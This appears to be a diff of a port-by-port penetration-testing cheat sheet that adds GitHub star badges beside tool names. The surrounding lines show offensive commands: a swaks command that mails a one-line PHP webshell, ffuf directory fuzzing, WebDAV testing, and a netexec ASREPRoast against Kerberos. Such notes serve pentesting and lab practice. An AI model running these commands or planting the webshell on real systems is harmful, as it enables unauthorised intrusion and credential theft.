@@ -38,7 +38,7 @@ ssh -L 'LISTENPORT':'FORARD_IP':'FORWARD_PORT' 'USERNAME'@'SSH_SERVER_IP'
 
 
 ## 25
-- swaks
+- swaks ![GitHub Repo stars](https://img.shields.io/github/stars/jetmore/swaks?style=social)
 ```sh
 # send webshell
 swaks -f 'FROM_USERNAME@DOMAIN' -t 'TO_USERNAME@DOMAIN' -d '<?php system($_REQUEST["cmd"]); ?>' -s 'IP'
@@ -46,7 +46,7 @@ swaks -f 'FROM_USERNAME@DOMAIN' -t 'TO_USERNAME@DOMAIN' -d '<?php system($_REQUE
 
 
 ## 80
-- cadaver
+- cadaver ![GitHub Repo stars](https://img.shields.io/github/stars/notroj/cadaver?style=social)
 ```sh
 # connect to webdav
 cadaver 'URL'
@@ -57,12 +57,12 @@ curl -I 'URL'
 curl -X OPTIONS -I 'URL'
 curl -ks 'URL'
 ```
-- davtest
+- davtest ![GitHub Repo stars](https://img.shields.io/github/stars/cldrn/davtest?style=social)
 ```sh
 # test webdav
 davtest -url 'URL' -cleanup
 ```
-- ffuf
+- ffuf ![GitHub Repo stars](https://img.shields.io/github/stars/ffuf/ffuf?style=social)
 ```sh
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ/
@@ -95,10 +95,10 @@ nmap -n -Pn -p80 -sV --script=http-default-account 'IP'
 
 
 ## 88
-- impacket-GetNPUsers  
+- impacket-GetNPUsers ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
 - impacket-GetUserSPNs
-- kerbrute
-- netexec
+- kerbrute ![GitHub Repo stars](https://img.shields.io/github/stars/ropnop/kerbrute?style=social)
+- netexec ![GitHub Repo stars](https://img.shields.io/github/stars/Pennyw0rth/NetExec?style=social)
 ```sh
 # ASREPRoast (TCP389番も必要)
 netexec ldap 'IP' -u 'USERLIST' -p '' --asreproast 'FILE'
